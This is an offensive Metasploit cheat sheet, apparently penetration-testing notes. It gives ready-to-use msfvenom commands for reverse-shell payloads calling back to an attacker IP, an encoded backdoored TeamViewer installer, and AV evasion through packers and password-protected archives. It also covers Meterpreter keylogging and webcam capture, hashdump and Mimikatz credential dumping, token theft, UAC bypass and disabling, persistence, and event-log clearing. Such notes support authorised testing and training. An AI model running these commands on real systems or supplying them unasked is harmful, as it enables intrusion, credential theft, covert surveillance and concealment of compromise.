# Metasploit

## Auxiliary Modules

### Port Scan

```
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.0/24
run
```

### DNS Enumeration

```
use auxiliary/gather/dns_enum
set DOMAIN target.tgt
run
```

### Host FTP Server

```
use auxiliary/server/ftp
set FTPROOT /tmp/ftproot
run
```

### Proxy Server

Any proxied traffic matching the subnet of a route will be routed through the specified session. Use proxychains configured for socks4 to route application traffic through a Meterpreter session.

```
route add 10.10.120.0/24 4
use auxiliary/server/socks_proxy
set Version 4a
set SRVPORT 9050
run
```

---

## msfvenom

### List Payloads

```bash
msfvenom -l payloads
msfvenom -l encoders
msfvenom -l formats
msfvenom --help-formats
```

### Format Options

| Format | Description |
|---|---|
| `exe` | Windows executable |
| `elf` | Linux executable |
| `aspx` | ASP.NET web payload |
| `jsp` | Java Server Pages |
| `war` | Java web archive |
| `php` | PHP script |
| `py` | Python script |
| `pl` | Perl script |
| `rb` | Ruby script |
| `raw` | Raw shellcode |
| `c` | C code |
| `ps1` | PowerShell script |
| `dll` | Windows DLL |
| `msi` | Windows installer |

### Common Payload Generation

```bash
# Windows Meterpreter reverse TCP (exe)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o met.exe

# Windows x64 Meterpreter reverse TCP
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o met64.exe

# ASPX Meterpreter reverse TCP (for IIS)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx -o shell.aspx

# Linux Meterpreter reverse TCP
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf

# PHP reverse shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php

# Java WAR reverse TCP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o shell.war

# Python reverse TCP
msfvenom -p cmd/unix/reverse_python LHOST=10.10.14.5 LPORT=4444 -f raw
```

### Encoding Payloads

```bash
# Single encoding pass
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -e x86/shikata_ga_nai -f exe -o mal.exe

# Multiple iterations
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o payload.exe

# Bad character removal
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
```

### Backdoored Executables

Inject payload into a legitimate executable template. The `-k` flag runs the original program in a separate thread so it appears to function normally.

```bash
msfvenom -p windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
```

### Multi/Handler

Set up a listener to catch reverse connections from msfvenom payloads:

```
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
run
```

Run as a background job:

```
exploit -j
```

---

## Meterpreter

Meterpreter uses DLL injection to reside entirely in memory. It leaves no traces on disk, uses AES-encrypted communication (MSF6+), and can migrate between processes.

### How It Works

1. Target executes the initial stager (bind, reverse, etc.)
2. Stager loads a Reflective DLL
3. Meterpreter core initializes, establishes an AES-encrypted link
4. Extensions `stdapi` and `priv` (if admin) are loaded over AES

### Core Commands

| Command | Description |
|---|---|
| `background` / `bg` | Background the current session |
| `exit` / `quit` | Terminate the Meterpreter session |
| `guid` | Get the session GUID |
| `help` | Display the help menu |
| `info` | Display information about a Post module |
| `irb` | Open an interactive Ruby shell on the session |
| `load` | Load one or more Meterpreter extensions |
| `migrate` | Migrate the server to another process |
| `run` | Execute a Meterpreter script or Post module |
| `sessions` | Quickly switch to another session |
| `sleep` | Force Meterpreter to go quiet, then re-establish |
| `transport` | Change the current transport mechanism |
| `uuid` | Get the UUID for the current session |

### File System Commands

| Command | Description |
|---|---|
| `cd` | Change directory |
| `ls` / `dir` | List files in current directory |
| `pwd` / `getwd` | Print working directory |
| `cat` | Read the contents of a file |
| `edit` | Edit a file (vim) |
| `rm` | Delete the specified file |
| `mv` | Move source to destination |
| `cp` | Copy source to destination |
| `mkdir` | Make directory |
| `rmdir` | Remove directory |
| `upload` | Upload a file or directory |
| `download` | Download a file or directory |
| `search` | Search for files |
| `checksum` | Retrieve the checksum of a file |
| `show_mount` | List all mount points/logical drives |
| `lcd` | Change local working directory |
| `lpwd` / `getlwd` | Print local working directory |
| `lls` | List local files |

### Networking Commands

| Command | Description |
|---|---|
| `arp` | Display the host ARP cache |
| `ifconfig` / `ipconfig` | Display network interfaces |
| `netstat` | Display the network connections |
| `portfwd` | Forward a local port to a remote service |
| `route` | View and modify the routing table |
| `resolve` | Resolve hostnames on the target |
| `getproxy` | Display the current proxy configuration |

### System Commands

| Command | Description |
|---|---|
| `clearev` | Clear the event log |
| `execute` | Execute a command |
| `getpid` | Get the current process identifier |
| `getuid` | Get the user the server is running as |
| `getsid` | Get the SID of the running user |
| `getprivs` | Attempt to enable all privileges for the current process |
| `getenv` | Get environment variable values |
| `kill` | Terminate a process |
| `pkill` | Terminate processes by name |
| `pgrep` | Filter processes by name |
| `ps` | List running processes |
| `shell` | Drop into a system command shell |
| `sysinfo` | Get information about the remote system |
| `reboot` | Reboot the remote computer |
| `shutdown` | Shut down the remote computer |
| `reg` | Modify and interact with the remote registry |
| `steal_token` | Steal an impersonation token from a process |
| `drop_token` | Relinquish any active impersonation token |
| `rev2self` | Calls RevertToSelf() on the remote machine |
| `localtime` | Display the target system's local date and time |
| `suspend` | Suspend or resume a list of processes |

### User Interface Commands

| Command | Description |
|---|---|
| `enumdesktops` | List all accessible desktops and window stations |
| `screenshot` | Grab a screenshot of the interactive desktop |
| `screenshare` | Watch the remote user's desktop in real-time |
| `keyscan_start` | Start capturing keystrokes |
| `keyscan_dump` | Dump the keystroke buffer |
| `keyscan_stop` | Stop capturing keystrokes |
| `keyboard_send` | Send keystrokes |
| `idletime` | Returns seconds the remote user has been idle |
| `record_mic` | Record audio from the default microphone for X seconds |
| `webcam_list` | List webcams |
| `webcam_snap` | Take a snapshot from the specified webcam |
| `webcam_stream` | Play a video stream from the specified webcam |

### Privilege Commands

| Command | Description |
|---|---|
| `getsystem` | Attempt to elevate privilege to local system |
| `hashdump` | Dump the contents of the SAM database |
| `timestomp` | Manipulate file MACE attributes |

---

## New Meterpreter Session Steps

After gaining access, insert AV path exception, write implant to disk and execute to catch callback:

```
getuid
getpid
getprivs
ps                      # find an svchost.exe in same user context
migrate <svchost_pid>
getpid                  # confirm new pid
ps                      # verify correct process
del /path/to/implant    # remove artifact from disk
```

Now running as a thread in the address space of the `svchost.exe` process.

---

## Process Migration and Token Stealing

```
meterpreter > ps
meterpreter > migrate <PID>
meterpreter > steal_token <PID>
meterpreter > getuid
```

Use `steal_token` when you need to impersonate another user's security context without fully migrating into their process.

---

## Credential Harvesting

### Hashdump

```
run post/windows/gather/hashdump
hashdump
```

Output format: `Username:SID:LM hash:NTLM hash:::`

LM hash `aad3b435b51404eeaad3b435b51404ee` = empty password.
NTLM hash `31d6cfe0d16ae931b73c59d7e0c089c0` = empty password.

### Credential Collector

```
run post/windows/gather/credentials/credential_collector
```

### Kiwi (Mimikatz)

```
load kiwi
help kiwi
```

| Command | Description |
|---|---|
| `creds_all` | Retrieve all credentials (parsed) |
| `creds_kerberos` | Retrieve Kerberos creds (parsed) |
| `creds_msv` | Retrieve LM/NTLM creds (parsed) |
| `creds_ssp` | Retrieve SSP creds |
| `creds_tspkg` | Retrieve TsPkg creds (parsed) |
| `creds_wdigest` | Retrieve WDigest creds (parsed) |
| `dcsync` | Retrieve user account information via DCSync |
| `dcsync_ntlm` | Retrieve user NTLM hash, SID and RID via DCSync |
| `golden_ticket_create` | Create a golden kerberos ticket |
| `kerberos_ticket_list` | List all kerberos tickets |
| `kerberos_ticket_purge` | Purge any in-use kerberos tickets |
| `kerberos_ticket_use` | Use a kerberos ticket |
| `kiwi_cmd` | Execute an arbitrary mimikatz command |
| `lsa_dump_sam` | Dump LSA SAM |
| `lsa_dump_secrets` | Dump LSA secrets |
| `password_change` | Change the password/hash of a user |
| `wifi_list` | List wifi profiles/creds for the current user |
| `wifi_list_shared` | List shared wifi profiles/creds (requires SYSTEM) |

---

## Local Exploit Suggester

Background your current session, then:

```
use post/multi/recon/local_exploit_suggester
set SESSION <id>
set SHOWDESCRIPTION true
run
```

Use the suggested exploit:

```
use exploit/windows/local/<suggested_exploit>
set SESSION <id>
set LHOST tun0
set LPORT <new_port>
run
```

---

## Execute a Program

| Flag | Description |
|---|---|
| `-H` | Create the process hidden from view |
| `-a` | Arguments to pass to the command |
| `-i` | Interact with the process after creating it |
| `-m` | Execute from memory |
| `-t` | Execute with currently impersonated thread token |
| `-s` | Execute process in a given session as the session user |

```
meterpreter > enumdesktops
meterpreter > execute -s 1 -f calc.exe
```

---

## Powershell from Meterpreter

### Powershell Extension

```
load powershell
powershell_shell
```

### One-shot Commands

```
execute -if powershell.exe -a "dir"
execute -if powershell.exe -a "net group"
execute -if powershell.exe -a 'net user /domain'
```

---

## Incognito (Token Impersonation)

```
load incognito
list_tokens -g
impersonate_token "BUILTIN\Administrators"
```

---

## Upgrade Shell to Meterpreter

```
use multi/manage/shell_to_meterpreter
set SESSION <id>
set LHOST <ip>
set LPORT <port>
run
```

---

## Post-Exploitation Modules

### Windows Survey Modules

```
run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24
run post/windows/gather/checkvm
run post/windows/gather/credentials/credential_collector    # requires SYSTEM
run post/windows/manage/migrate
run post/windows/gather/dumplinks                           # migrate to user process first
run post/windows/gather/enum_applications
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_shares
run post/windows/gather/enum_snmp
run post/windows/gather/hashdump                            # requires SYSTEM
run post/windows/gather/usb_history
use post/multi/recon/local_exploit_suggester
use post/multi/gather/firefox_creds
```

### Winenum

Built-in enumeration using net, netsh, and wmic commands:

```
meterpreter > run winenum
```

Output stored per-command in the path shown in the output.

---

## Routing and Pivoting

### Set Route

```
route add <subnet/host> <subnetmask> <session_id>
```

### Autoroute Module

```
use multi/manage/autoroute
run autoroute -s 10.100.11.0/24
```

### Port Forwarding

```
portfwd add -l <LOCAL_PORT> -p <REMOTE_PORT> -r <REMOTE_HOST>
```

---

## UAC Escalation

```
use exploit/windows/local/bypassuac_windows_store_reg
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 8080
set SESSION 2
run
```

### Change UAC to Not Notify

Requires admin:

```powershell
Get-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
# Look for: ConsentPromptBehaviorAdmin, ConsentPromptBehaviorUser
Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
```

### Disable LUA (UAC)

```powershell
Get-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
# Look for: EnableLUA 1
Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name EnableLUA -Value 0
# Requires restart — ensure persistence is set up first
```

---

## Persistence Modules

### Registry Run Key

```
use exploit/windows/local/registry_persistence
```

Set `RUN_NAME` at minimum.

### WMI Event Subscription

```
use exploit/windows/local/wmi_persistence
```

Requires failed login auditing enabled:

```
auditpol.exe /set /subcategory:Logon /failure:Enable
```

Event ID for failed logon: `4625`. Set `USERNAME_TRIGGER` and `SESSION` at minimum. Cannot be run as SYSTEM or USER — needs ADMINISTRATOR.

---

## Clearing the Event Log

```
meterpreter > clearev
```

---

## Firewall and IDS/IPS Evasion

### Endpoint vs Perimeter Protection

| Type | Description |
|---|---|
| **Endpoint** | Software on the host (AV, anti-malware, host firewall, anti-DDoS) |
| **Perimeter** | Physical/virtual devices at the network edge (IDS/IPS, network firewalls, WAF) |

### Detection Methods

| Method | Description |
|---|---|
| Signature-based | Compares packets/files against known attack pattern signatures |
| Heuristic / Statistical Anomaly | Behavioral comparison against established baselines |
| Stateful Protocol Analysis | Recognizes divergence from accepted protocol definitions |
| Live SOC Monitoring | Analysts using live-feed software to monitor and alert |

### Evasion Techniques

**MSF6 AES Encryption**: All Meterpreter communications are AES-encrypted, handling network-based IDS/IPS.

**Backdoored Executables**: Inject payload into legitimate executables using the `-x` template flag and `-k` to keep original execution:

```bash
msfvenom -p windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
```

**Password-Protected Archives**: Archive the payload with a password and strip the file extension. This bypasses many signature-based AV scans (flagged as unable to scan, not as malicious).

```bash
rar a ~/test.rar -p ~/payload.js
mv test.rar test
rar a test2.rar -p test
mv test2.rar test2
```

**Packers**: Executable compression that packs payload + decompression code into one file. The payload decompresses transparently at runtime.

| Packer | Notes |
|---|---|
| UPX | Open source, widely used |
| The Enigma Protector | Commercial |
| MPRESS | Lightweight |
| Themida | Advanced anti-debugging |
| MEW | Minimal |
| ExeStealth | Stealth-oriented |

### MSF6 Changes (Evasion Improvements)

- End-to-end AES encryption for all five Meterpreter implementations (Windows, Python, Java, Mettle, PHP)
- SMBv3 client support with encryption
- Polymorphic payload generation for Windows shellcode (instructions shuffled each generation)
- DLLs resolve functions by ordinal instead of name
- `ReflectiveLoader` export no longer present as text data in payload binaries
- Meterpreter commands encoded as integers instead of strings
- Kiwi replaced old Mimikatz extension
